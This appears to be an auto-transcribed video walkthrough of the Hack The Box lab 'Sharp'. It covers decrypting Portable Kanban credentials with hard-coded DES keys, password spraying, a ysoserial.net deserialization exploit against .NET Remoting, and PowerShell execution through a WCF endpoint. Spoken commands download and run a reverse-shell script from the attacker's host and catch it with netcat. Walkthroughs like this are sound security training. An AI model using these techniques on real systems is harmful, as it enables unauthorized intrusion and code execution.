 what's going on youtube this is ipsec i'm doing sharp from hack the box and i really like this box because it shows a lot of the low-hanging fruit you can find when analyzing.net binaries the first one is just decompiling it to find hard-coded crypto secrets that can be used to decrypt values out of the config normally are passwords there's also another way you can decrypt the password that's pretty funny that we'll get into the second one is a net application just has the net remoting endpoint listing on tcp you can send it a serialized payload and get code execution and then the third one is just looking at windows communication foundation and seeing there's an endpoint to execute powershell and just sending it a powershell payload and this box probably has to be done from windows but in order to make it easy between the vpn on a linux and windows i'm going to go the extra mile and convert our linux machine into a router so we can have both linux and windows connected to hack the box simultaneously with all that being said let's jump in as always we're gonna start over the nmap so dash sc for default scripts sv enumerate versions oh a output all formats print the nmap directory and call it sharp and then the ip address which is 10 10 10 to 19. this can take some time to run so i've already ran it looking at the results we have just four ports open and these top two ports they might as well be the same ports we have 135 and 139 135 is windows rpc 139 is net bios these two pretty much the same thing at least in my eyes then we have smb on port 445 and this weird port 8888 we don't see any nmap like nse scripts telling us that there's a web server um i realize i don't have firefox open so i just opened it but i still like going to this port just to make sure so we can do a curl on 10 10 10 to 19 port quad 8 and we don't get anything back so it's not a web server so what we're going to do is copy these over into obsidian so we take notes i can press ctrl n to create a new note and we'll do o5 enumeration and then nmap and pasted results it does tell us there is the clock skew of looks like one hour so probably some time zone is wrong but yeah nothing too interesting since we don't have a web server or anything i'm going to do a full port scan just in case something is hiding while we poke at other services so let's do sudo nmap dash p dash we'll do the ip address of 10 1010 219 and oa nmap sharp dash all ports so that looks good and now while that runs we can go and poke at smb so i'm gonna go in my opt crack map exact directory because i just installed this horribly and this is how i generally run it now i'm gonna do a git poll to make sure this directory is up to date it looks like it is or do poetry install here just to install all the packages in case it is not looks like we're on the latest so we can do poetry run crack map exec smb 10 10 10 219 to make sure this works so once this connects we can potentially get other things it is telling us it is a windows 10 box so i'm going to also put this in enumeration os version there we go and the things we can do with this we can potentially do shares so i'm going to add dash dash shares and see if this gets us anything and we get an access denied crackmap exec does support no authentications if we just pass a blank user and blank password so we should check this out as well and we get access denied it is taking a while and we do get some shares so i'm going to copy this to the notes as well and we'll create a new note saying 10 share noom and we can always clean these titles up later i just don't want to spend too much time thinking of what to put here but we do definitely want to keep these notes so instead of shares we can try some other things so it does support like users um there's a password policy one as well so i'm trying to run multiple simultaneously just to see what information we can get so pass paul and if you go to ipsec.rocks you can probably just search like smb and all authentication and find a bunch of other things of using other tools then crack map exec you should always test multiple tools because sometimes the tools do fail and we get status 9 on both of these so the only thing we really have is that uh spider share or is that oh that was taking a while actually i had to control see that uh i just assumed after seeing access tonight it was done but it could still be working so let's go back into opt crack map and then we're going to do dash capital m for module and spyder underscore plus and this is going to do something pretty cool and i'm going to create another pane so we can copy the results but it's going to crawl all the shares and put the results and temp at cme spider plus so i'm just going to copy that we'll go over here and move that here and we'll call this um smb a new i will call smb files dot log and let's see spider plus it did not copy the entire path so let's do temp let's recopy that no it did what oh it's a directory 101010219.json okay that's what the issue was so if we look at this file we can see it's just json we can do jq to make it pretty and we can look at the files if we wanted to we could probably find a jq query to like get rid of these modify times or we can just like grab dash v on time underscore and then pipe to gq again to make it pretty but i want to keep those times in because i just want to look to make sure there's nothing unique i see the common thing is november 12th and november 14th so i'm going to do a grep on time and then also a grep on 11-1 and then 2 4 and brackets so this is going to do both of those i'm going to do dash v to exclude it and we can make sure that grep is valid by just grabbing it and only shows those values so the share is only accessed during two times and i always like finding outliers because whenever i look at files i look at the one that has the unique timestamp and the most unique timestamp these look to be all the same uh there is a zip file and we also have portable kanban pk3 dot back so i don't know what kanban is let's now go and google this so i'm going to google portable kanban and maybe i'm pronouncing that correct maybe i'm not who knows but we can see portable kanban is an exploit this exploit db think i think came out after the box was released so i'm going to ignore all like potential exploits for it uh let's see maybe we can just search kanban and see what this is so it looks like it is some plug-in for atlassian probably jira some package management tool we could watch this video to figure out what it is but i'm happy now there is a bunch of files we can download but the main thing i want to look at right now is this dot zip file so we can try this crack map exec again and then if we do dash dash get dash file i think and we can say kanban pkb.zip to pkb.zip and i probably have to go into opt crack map one day i'm going to reinstall crack map and do it correctly and maybe i'll do a video on that one but we get access denied so i think there's actually a bug with crack map exec and trying to download files with null authentication because i was trying this quite a bit like even changing up the quotes in case like a backslash god escaped but i think this just happens when you do null authentication and this goes back to knowing how to do the same type of attack with multiple tools because if you just depend on one tool when you run into an issue um you're just kind of sol so we're going to switch over to smb client and if we tried a similar thing like u is equal to nothing and then slash 10 10 10 219 kanban and put nothing for the password we get log authentication failure to do this null authentication smb client we need dash capital n and we do anonymous login and now we are here so every tool kind of has its quirks it's good to know how your tools work so i'm going to do git pkb.zip and we can download this uh does this support mget let's see mg it looks like it does mgit is downloadable so actually what i want to do is make the smb maker kanban to stay kind of organized we can do this authentication again and do m get star and there's probably a way to do force to say yes to everything it's probably like dash f or dash y but i'm just gonna hit y a few times and accept everything it shouldn't take too long come on or we could do like um another tool to do this i'm trying to think of what i used to use i think smb map would also download files but now we have a bunch of files so if we go back to the previous directory of kanban and one thing we probably should do is cat smb files off log and i'm going to grab v time and size like that the or syntax is just backslash pipe and grep so we got that and i'm going to grips for colon space bracket and our jq we do jq dot we can go in one directory to ignore kanban and now we just get files so arc dash capital f do double quotes this is going to set the field separator to double quotes and now this should of worked but it did not uh let's see awk dash f print zero one maybe two okay two is the field separator uh if we look at what we were doing wrong uh one was getting what was b for this so two is this so now we just got a list of files in the kanban chair we can copy this and say kanban share and paste all the files okay so the next thing we were doing is going through this pkb.zip i just want to make a directory pkb because whenever unzipping things it can like destroy your current working directory so i always make a habit to make a directory before i unzip in case it does what it just did and put things in the current working directory so it looks like we have bunches of dlls so what i'm going to do is we're going to copy pkb into smb and now our smb share has kanban and pkb and since this is a executable and windows stuff i'm going to go over to windows but before i do that there's two things i want to do ipaddress get my machine's ip which is 192.168.1.230 and then we want to start up an smb server so smb server dash smb2 support dash user is ipsec dash password is also going to be ipsec and then the share name which will be share and then pwd to get the current working directory and we have to run that with sudo and now i'm just going to quickly go over to my windows machine and we can mount this drive so going to 192.168.1.230 share i use the same credentials on this vm so it just didn't prompt me and we have kanban and pkb so i always like working off of um my desktop or the file system instead of working off a remote share especially when like this isn't a true file server since it's just impacted and anything impact it does is hacky and prone to bugs so if i was running maybe like smbd i'd be more confident working off the share but since i'm not i'm not going to worry about it so if we open up portable kanban it looks like we create a local file blank password we can load this program and we don't really have anything if we looked at the files on the share if we go back to the kanban directory we have a lot of files that aren't in this pkb directory namely one that just got created if we had read everything uh can i make this bigger there we go this not kanban.cfg but pk3 this pk3 file is the backup and there's two ways or two things interesting about this i'm just going to copy the backup to our kanban install and then we'll open up and sublime and we can see more jquery let's go over to our linux box so we can view this jquery better so let's go smb kanban uh yeah kanban and then cat portable kanban pk3 dot back to jq and we can also see there's a dot back and a regular one so what i could also do is md5 sum portable kanban dot pk star and both these have the same md5 sum oddly the pk3.md5 has a different sum than this i don't know what's going on there but here we can easily view the config so columns nothing too interesting there tasks doesn't look interesting now we have administrator and encrypted password we can see if this encryption is real encryption by just doing uh echo dash n and then attempting a base64 decode it and it looks like it is um i think ent is a command for entropy uh 3.87 bits per byte uh this doesn't seem too random uh we if it was like properly encrypted and completely random this would be closer to eight we'd see like seven point something so because this is low leads me to believe um it's really bad encryption i hope i'm speaking that right i actually didn't run entropy beforehand so did not prepare for that result i was expecting it to be more random but whenever you see encryption and it's not high entropy chances are you should poke into it so administrator lars so we get a potential username here um we can try like blanking out the administrator user so if i go back into commando and actually before we do that we can see this role is admin this role is user what if we created a new user so i'm going to go into commando we're going to look for administrator right here find where this bracket begins and i'm going to copy this whole thing and then we're going to find where the next user ends so looks like right here this is the next user of lars i'm going to do com comma and then paste this and we are working with this we probably want to give it a different id so i'm just going to do like a2 because i don't think that exists the name i'm going to give it ipsec email encrypted password i'm going to blank out the password and then we're just going to save this config and this is in desktop slash pkb right here uh is it stopped back it is not back so let's go desktop pkb and we're going to copy that backup file to kanban paste and i'm going to delete whatever config was here before and we're going to open up kanban again so it says data successfully recovered from a backup file and if i do ipsec with a blank password lets me maybe log in i probably screwed something up with the config but let's try that again so open this up ipsec if you click continue and ignore uh can't find plugins so let's try copying the plugins in this was also on the smb share maybe we should have just ran portable kanban from here instead of the zip so now we have the plugins let's see if it still airs um let's close that i just accidentally opened the dll portable kanban let's do ipsec enter and okay no error message we get this and if i click on this settings icon we can go to users and this tool lets us hide passwords and view them so we can potentially get user credentials out of here so let's see if my copy and paste between vms is working if i do this it looks like it is so let's go and create notepad we can say administrator that and then lars and put this password lars there we go instead of colons i'm going to use pipes because that's markdown and then we will paste this over into obsidian and there's another way we can go do this so if you didn't want to go through the application we can always open that up in something like the inspire il spy and decompile and look at how it does the crypto so let's do creds paste this creds and then we'll say method user pass kanban kanban there we go uh we need one last thing in markdown like that and now we can view it so i'm going to do is create one i will say 15 kanban and the other thing we have to do is go back to our windows machine and take a screenshot of this so i'm just going to do print screen loads up flame shot because i have that on my windows vm and the copy and paste with whole screenshots it doesn't work i don't think so i'm just going to save the capture and we're going to save it on let's see where's desktop i guess desktop's not here um let's see slash 192.168.1230 share and then this will be kanban gui and then if i open up places home and we can go slash opt hd not up home hdb uh what is this you can see my home directory is getting awfully messy i need to rebuild my vm soon smb we can drag the picture here so now we have kanban gui extract cred via config and at the end of the video maybe i'll write an explanation on exactly what we did but time is of the essence so let's just move on to how else we get this credential so since the application can natively decrypt it and there's always the chance that we couldn't get this application working we should go with another option as well and that is dnspy i don't know if i have dnspy on this vm but downloading it is easy enough so we just go to google dnspy and then go over to releases and download the zip i'm going to open this and i'm going to make a directory dnspy so new folder dnspy and we'll just copy it over here and then we can open oop i did not mean the console i want the regular.exe and we open dnspy i can do file open and we want to do let's see desktop kanban and probably kanban's dll as well so we can poke around kanban to see what's there i like looking at dlls first because that's more where code is and if we look at let's say out of all these crypto sounds really interesting so let's look at crypto and scanning for the decrypt function we can see it's just doing des crypto and nothing really here but it does do two static bytes right here quick so it's going to call rgb key and rgb iv which is an initialization vector and we have two secrets so i'm going to take a screenshot and actually i'm going to make this a bit smaller so we can get this whole function print screen highlight and then we can put text and say hard-coded crypto secrets and then put a box around that like that and then of course save the capture to a file and we'll say crypto secrets so now what's left is going back over to a cali box and building a quick script to decrypt this so i'm going to copy and paste that string and i'm going to go into just my sharp directory we'll call this deck.pi i guess or give it kanban deck or kanban dash decrypt dot pi there we go so i'm just going to paste those two strings because we need the [Music] secret and iv so let's see get that okay and i hit d w to delete word it's going to delete a word or up to where the next string is so let's put this all in single quotes because that's how i like it and we're going to have to put our imports so i'm going to be really lazy with the script i'm just going to import sys so i have access to rxv i'm going to import base64 so from base64 import b64 decode and then we also want to import des to decrypt so let's go actually we don't need the password yet so we can say the password is going to equal b64 decode sys.org v1 and we'll import the password and this comes from the config and then we want to initialize the uh crypto object so i'm just going to call this c is equal to [Music] key i think that's the function within des and we want to put this string that and this is python 3 so it probably wants it in byte form and if it errors out it doesn't work i'm going to take the byte form off and then we need iv is equal to this and then let's do print and we can say c for crypto dot decrypt passwd initialization is equal to iv and padding is equal to true and when you work with ctfs and pythons a lot you just remember exactly how the small libraries work actually to be determined uh we'll see if this works so i'm going to cat smb then we'll go into kanban and we want portable kanban.pk3 jq and then grep pass i'm going to grab both of these passwords so i'm going to do whoops i think i right clicked and did paste python3 then kanban decrypt paste and a file line nine so i've made an error somewhere let's see did not do a last quote typo on base64 des has no attribute desk key let's see python 3 does decrypt single dez does new see this is using crypto dot cipher and we can probably switch to use this real quick or we can look at this one this is pi installed dez dez key with a capital d and a capital k so let's try that capital d capital k there we go so administrator was that we can go over to our credentials and eyeballing g2 with our global case that looks correct and we could also go for the next one and see what this is so if i paste this we get the other password so that is both ways we can grab the kanban password so the next step to do after that is of course spray with those passwords so i'm going to do cd opt crack map exec and we're going to spray with administrator and lawyers so first we have to create the user and password file so i'm going to go hdb sharp users.txt and i'm going to look at this go to my creds administrator and learners so administrator blars i'm going to do the same thing with passwords so password.txt and we're going to copy and paste these so paste and then we can paste this so we can run poetry run crack map exec is it all caps are not on no caps attack map exec yep smb 10 10 10 129 dash u we'll do hdb sharp users.txt dash p hdb sharp passwords.txt and then let this go and see what it results it can take a little bit to run so we screwed something up is the ip address actually 129 let's do less hdb sharp end map shark dot nmap 10 10 10 219 um slight case of dyslexia or misremembering but there we go if you don't get any results from crackmap exec chances are the ip address is wrong so we get a hit we have lars with a successful credential so we're going to send this over into our notes and say 20 success actually uh yeah we can do this 20 lars cred cme and then this kanban and valid because we tested this and did not get a hit so always updated notes with what is valid or not since we have a hit on this credential i'm going to specifically try this so lars p and we're going to use winram to see if potentially we can access it that way because crack map exec doesn't say pound i know i can't just get a shell via this but there's a chance we could have got a shell via winrm we didn't and this is why i always try smb first because smb will auth if you have no shell or shell where when rm will just fail so let's go back here switch it up to smb and then we can do shares again so looking at this we'll see if he has access to anything else and then if i don't have access to shares that's when i may try to go into other things like um let's see other things like remote registry things like that but we do have access to this dev share so i'm going to do dash m spider underscore plus and we're going to look at this one and it's going to write the output into um spider plus if i cat this with jq and of course this is a directory and we have two folders we have this kanban folder up here again uh well that's ipc so we don't have access to kanban we have access to ipc and notes so let's go back and do our grep syntax of grep v and we can say time and size and then i want to grep for semicolon bracket and then we'll arc dash f double quote print two and i will leave ipc and dev here because those are the two shares and we'll copy this over to our notes so going back to laura's cred we can say share a new paste and then ipc and dev so these are shares so i like just notating that with double backslash and putting a space between the ipc chances are this isn't too interesting um when socks catalog change listener i don't know exactly what that is i'm guessing it has something to do with what's going on later in the box but we also have this dev share and this has client.exe remoting library server.exe and notes so what i'm going to do is we'll go into hdb sharp go in smb make dirt dev and we'll go into dev and say smb client dash u lars 10 10 10 219 dev uh we need backslashes maybe let's say oh no we don't we need a capital u and then the password let's go cme again so we can just copy and paste that password or it could have went into obsidian because we're taking notes but now we have smb i'm going to do m get dash h let's say dash f that's why maybe there's no i think i did in a video but we'll just do y for each file and we downloaded a handful of files so we have a server.exe remoting library notes and client.text if we look at notes it says migratefrom.net remoting to wcf and then also add input validation but we don't know much uh we could strings client and see what there is this is a net binary uh we can see the user is cube0x0 so we could go into opt crack map exec and do poetry run and then this time specify the password as htb sharp passwords and the user as cube 0x0 and see if we get a hit because we just got another username out of metadata we did not but doesn't look like anything interesting here but strings is not a good way to analyze a dot-net binary doing it on windows is so let's go over into windows and we'll go back to our share and where is this we can refresh and now we have this dev so i'm just going to copy the dev folder over to my desktop and we probably should of put all these in a like sharp folder so we had a bit better organization scheme but hindsight is 20 20. doing ctrl o to open we go to desktop dev and then we can look at i guess server and we can do remoting library and client to open everything up so we look at server we can see it's using system remoting sample and let's see this is on port so we know um at least that and it's doing binary service formatter um remoting here's a potential endpoint uh whoa i did not mean to click that register well known uh service type but what i'm going to do is screenshot this start server and then i want to highlight the port and potentially this because this looks like how we can access it secret sharp debug whenever you see like secret and some type of source code chances are that should be highlighted so we'll save that capture to dev server port and let's go over and look at the client using system remoting sample and it looks like we have um credentials so debug and sharp debug application password one two three so let's go back over to parrot uh let's see i am in crack map exec so debug dash p put the password since it has a special character of a quote i'm going to put it in quotes or a special character of an exclamation point and it does succeed so we know that is successful let's check winrm and it's probably let's see come on it fails we can do dash dash shares to see if this has access to anything else and it doesn't same shares it doesn't even have access to the dev and if i was more noticeable at first i think when we did the um no authentication dev did show up i just missed it so we do have credentials so let's go back to creds and say dev client debug and paste that so going back over to windows we can print screen and highlight this and let's see where is the box username password so at this point we'd search the code and one of the things is this is doing serialization between the client and server so let me just creds debug okay so if we look at let's see a remoting library does this have anything uh like nothing in this so if we look at the server this is like hard to explain i hate doing any reversing live so we got a binary server formatter sync provider and then it's going to accept this from the client and print it so if we went over to google and google like um let's see exploit.net remoting we got this tool here and let's see this ncc group article is also good so reading these two things would put together how to use this endpoint and we need this application so i'm going to download it and then we're just going to send a serialized payload to this service so i'm going to copy that here open it up i'm going to open this in visual studio and we just build it and the other application we need which is probably on this vm already is yso serial.net so i'm just going to go to this application go to releases download it and i think i did mention it but if you looked at note and dev so if we went back to dev uh smb dev less notes it's using.net remoting so that's also a hint so let's go release uh let's see this is yso serial so i'm just going to why so serial the one thing i hate about ysa serial.net and it's a super minor nitpick is the executable they give you it's still wiser serial.exe and wiser serial initially was a java deserialization framework but oh well so what we want to do is build the solution and we probably should have changed this over into release whenever you build things take it out of debug do yourself a favor every now and then debug has issues since we're running this on a local machine we won't have an issue but still best practice so we go into cmd and we want to copy this go into this directory and that's remoting service we want not the service we want the exploit uh i think i went in the wrong directory cd oh example and exploit i was reading these two as the same example and exploit so we definitely want to go into the exploit remoting service and then the bin directory and then release so when we run this tool we have a bunch of options so before we can run this tool we need a serialization payload so i'm going to open a second command prompt and we're going to go into desktop then yso serial and yso serial.exe and if you follow let's see these instructions here it's going to have you use the binary formatter with a type confused delegate so or delegate know which one pronunciation is hard so y00.exe dash f binary formatter and again if you look at the code as well where is dnspy i think it's saying binary formatter here binary service formatter so dash g type confuse del e gate that's how you spell it dash o we want base64 so we can just copy and paste from a clipboard and then the command we want uh let's see powershell iex new object net.web client see that looks good actually don't put this in quotes download string http 10 10 14. and then three three slash rev.ps1 so we run this and we have the payload and now we're going to run into an issue because we have an application here and this application isn't executable so we can't run exploit remoting service.exe on our linux machine it may be possible because this is net and because it's net i think we'll be able to run.net core on linux but there's an easier way where we can have both linux and windows on the same vpn for hack the box with some routing magic so i'm just going to build this payload here so we're not jumping between too many subjects at once and the pass we need uh shoot let's grab the pass from cali grab this copy paste and then we need to specify the endpoint of this dotnet remoting so tcp 10 10 10 219 888 and then the end point was this raw and we want the base 64. so obviously my windows machine cannot hit this endpoint of 10 10 10 to 19. so if i cls ping 10 10 10 2 19 can't get there so the way around this is we have to trade her out so we're going to convert our parrot machine into a router so i'm going to do sudo echo1 to process net ipv for ip underscore forward uh what permission denied uh let's do pseudo seo echo1 to this there we go um what i'm actually going to do is do this in obsidian so i'm going to create notes i'm going to put this at the start of this so o2 this is why i do these number credentials because if i want to put something between or something i can easily go back and do that i'm going to say turning parrot into a router there we go so the very first thing we did was enable ip forwarding so this enables let's see there we go mabel ip4d so now when a box gets a packet it can actually do some type of routing the next thing we have to do is create a iptables rule to take something from ethernet 0 and put it to ton zero and do some natting because if we don't do any natting whatsoever then when hack the box gets the packet it's just going to see a ip address of whatever a source is and it's going to fail actually we may be able to verify that so let's go to windows real quick route add 10 10 10.0 24 five net mask five five two five five dot zero and then one ninety two one sixty eight one two thirty that's the gateway right ipadr i already have it one two thirty is my guy's vm uh let's see gw route and uh we gotta have escalate there we go let's make this bigger and then we can go back here and grab our previous route add command paste it in and bad argument 255. so i notice i do cider notation and netmask which is redundant that doesn't work i don't think on windows you specify gateway i think you just do gateway after still bad argument route add help let's see route add oh it wants mask then netmask that's silly let's do route add ip address mask gateway there we go so i do a route print now we can see anything to 10 10 10 0 24 is going to go to the gateway 192.168.1.230. so we can test this out by going back to a parrot machine and do sudo tcp dump dash i ton zero icmp and dash n to not do dns lookups then we go back to commando uh and do a ping 10 10 10 219 we don't get any results if we look back at our tcp dump we're not getting any output and the reason here is we didn't um create an iptables rule to forward between two interfaces so what we want to do is say um let's see on windows was it ip was it route add 10 10 10 0 this is mask there we go okay so the next thing we have to do is enable forwarding so let's go back up on the linux machines and well we enable forwarding but we need to do the form forwarding so if we do iptables dash a for the chain forward we want to go from ton 0 to e0 so that's in l and we only want to forward things with a related or established state j accept and the reason why we do this is because there's no way to go from the vpn to windows directly because of port forwarding so we just say related established it's probably hard to understand if you don't know the basics of networking so this time we're going to create the reverse rule but allow our windows machine on each 0 to go out or ton adapter j accept so if we add these rules to iptables now we do iptables-l we can see the rules are there and if i do this ping again still not working if we look we do see we attempted to ping and what happened is we're pinging or hack the box ip with the wrong ip address like 192 168 1.2 is getting to hack the box and this machine's like i have no clue how to send this back it doesn't have that routing so what we have to do is create a nat rule and this nat rule is going to rewrite the ip address to be the ip address of that is connected to the vm so let's see add net and this is sudo iptables dash t nat a post routing dash s so this is only going to apply with ips of the source of the network 192.168.1.0 24. so we're not rewriting anything that isn't coming from ethernet zero dash o ton zero dash j masquerade and masquerade is the magic option that would just do the rewrite for us so if i paste this role in now and we go back from commando and ping we actually get a result back if we look at this the pings are coming out of 10 10 14 3 to 10 10 10 to 19. so now our parent machine is acting as a router all is good in the world so hope you enjoy this notes uh the next thing to do is obviously go hdb make dirt dub dub dub and we have to create a reverse shell so let's copy um what is it user what is reverse shell um let's see locate invoke dash and it is not power sport see invoke dash power shell the shane is the thing i was thinking about so user share the shang shells invoke powershell tcp.ps1 call it rev.ps1 and then we want to copy the reverse line paste and our ip address is going to be 10 10 10 or 10 10 14 3 port 9001 and then we can do sudo python3 mhtp.server80 and then this next one is going to be pseudo nc lvnp 9001 go back to commando and we can finally run this exploit so again this is running exploit remoting service giving the user name and credentials telling it it's a raw payload sending the base64 which is going to do the powershell iex command and we have a type l oh that sucks does it tell us what we did wrong tcp c exploit remoting service okay i think i see it we did not end the quote here so we put pass and quotes for sharp application but i did not put the other double quote so try running this again uh we get an error message but if we go back to parrot we see it hit rev.ps1 and we have the shell so good news for us i guess bad news for uh who is this lars so with this shell um what we probably should have done is our lrap because i don't have up and down so i'm going to redo this real quick so let's go back over here run this command again and um sudo rl wrap it's funny when you re-run it to fix something and forget to fix what you wanted to fix but thankfully getting the shell is easy so now i have up and down with rlrap awesome so let's go and see if we can get the flag and looking at the root directory we do have kanban and dev or i sound backwards but you see them there that's where the shares are so if we do dir here we just have two users lars and administrator we do the desktop we can see user.txt if we look at documents we can see a wcf directory and the easiest way to copy the directory is just use compress archive to compress it into a zip so we can say dash path wcf and then destination path wcf.zip and this will zip it up and then we'll just copy it over to a box afterwards now in order to copy it i'm going to use net use we can do like i think it's new ps drive and put credentials there but we have to use like powershell secure strings and it's just a pain so net use x colon and then 10 10 14 3 share and then the password was ipsec and then the user was also ipsec so let's see do we have an x drive now we do so let me go back to the c drive and we can copy wcf.zip to xcolon and if we go look at that x drive let's see dot dot slash smb uh oh i was in hdb dub dub dub i'm put a file where it should have been oh well let's go to shop and then smb we can see wcf.zip and like i said before i always like creating my directory first so copy wcf there and then unzip and it actually had created the wcf directory for us so this one didn't clobber our working directory but we can just move wcf backslash star here and then make sure the wcf directory is empty we got a vs so let's go wcf slash dot vs copy it here as well and now we can rm-rf wcl so we have a remoting application here so let's go back over to commando and we're going to reverse yet well we don't have to reverse we have the source code so yay for us so let's go to the share and copy wcf and we could have just got the zip but we'll see how long it takes to copy over localhost not long so let's close a bunch of these windows because i am horrible when it comes to window management on windows that was a funny sentence but we can open this wcf directory let's see open with visual studio 2019 and see what this program is about and i think her notes just suffered but i don't want to take time and document a bunch so this video sorry the notes aren't great we have a client so let's see if we have a username and password hard-coded we don't so we see this client and it's doing net tcp localhost 8889 so if we go back to our parrot and let's see exit out of here let's go into our nmap directory and less sharp dash all ports dot nmap we do see it is actually listening it's just not a um top 1000 so it's not in the default scan but 8889 is open so we can change this to 1010 14.3 port 8889 and it goes to wcf slash new wcf endpoint and it's just that one command so we can look at probably remoting sample to see how this works because it's doing console write line client dot disk info and this client we don't know exactly what this is this is just iwcf service so if we go into remoting we can see what commands there are it was doing users disk info cpu info i think we look at program disk cpu and ram so it also has this invoke powershell syntax and let's see here is how it executes disk info so it's just going to use wmi cpu info wmi ram info wmi get users uh it looks like this is actually doing powershell get local username dot name and then invoke powershell and then adding script text so we just call invoke powershell with the powershell we want and we should be able to get a reverse shell if we look at the server to see how this is working uh code view okay uh wcf service it's gonna listen on 8889 so we could if we wanted to take a screenshot of this on stop so let's just try modifying our program and the very first thing we want to do is run it as intended i don't want to do the invoke reverse or the powershell yet because who knows if it works actually what we can do is another console.writeline and this time we'll copy this and we won't do malicious powershell so invoke powershell so let's copy this client dot invoke powershell and we'll say um see what is it get child item i'm 99 sure that's powershell that should get the directory listing cmd uh get child item of course have to be in powershell yep get shot item so that looks good oh let's see we have something wrong though represent a character utf-16 code unit and i honestly don't know i think i'm just going to compile and hope it works um i don't know how to do like all the string conversions in.net let's see rebuild solution is it going to build if it doesn't uh too many characters literal maybe double quotes do quotes matter it's not air right programming languages are finicky that's all i have to say about that so it looks like we have it running um or compiled so we can try executing it and we could have also done this just through start so we could try this and see what happens uh you're debugging continue where's the output window this so we're going to 10 10 10 oh i don't know why i did 10 10 14 3 we want 10 10 219. for some reason i think in my head i was doing a port forward on my box uh let's see the login attempt failed so we don't have any credentials actually in this client but windows by default likes always using its um like the credential you're logged in with we could potentially do some type of token and add a credential here but the easiest way to test this to make sure it works is just use net use so let's go desktop let's go into this folder so let's go actually run as slash user we have largest password and i'm going to do slash net only cmd and net only means it won't validate so if i put a bad password here we got this command shell opened if i don't have net only here it's gonna attempt to log in and tell me it's failed so net only just like creates the token in there and you can also use this in combination with like bloodhound on windows so if you want if you had domain creds and your windows box could reach the domain you could do net only and then execute bloodhound or sharpound within windows so we need the password for lars so let's go back to here and we could have also done password for debug as well probably doesn't matter if one fails i will try the next one so we have password here i just press ctrl v to make sure we put the correct password we could potentially say dir 1010 10 219 dev and we get a listing and other users did not have access to devs so we know we have successfully logged into the server so let's go into cd backslash users ipsec desktop and then we were in dev and we built wait went on dev we're in wcf and then client bin release and then wcfclient.exe so if we run this what happens uh kind of error here don't know what that one's about but we do have it getting commands so we did something correct uh this may be a powershell line i'm not sure but let's see if we get it to execute code it's doing invoke powershell so iex new object net.web client download string http 10 10 14 3 slash rev.ps1 and that looks correct so let's rebuild solution and then go over here and make sure we have everything running doesn't look like we do so ls rev.ps1 see where is my dub dub dub directory i know i had done that wrong the last time you'll notice i have a lot of www directories because i always create files realizing i'm in the wrong directory but here we go we got that and we can do sudo nc lvmp 9001 again and we go back here we have successfully built it so let's try executing this client again um we probably could remove these because we don't need them anymore it would go a bit quicker we do have a get we do have a shell do who am i we're anti-authority system so users administrator desktop and we can read root.text so that will be the box hope you guys enjoyed it take care and i will see you all next week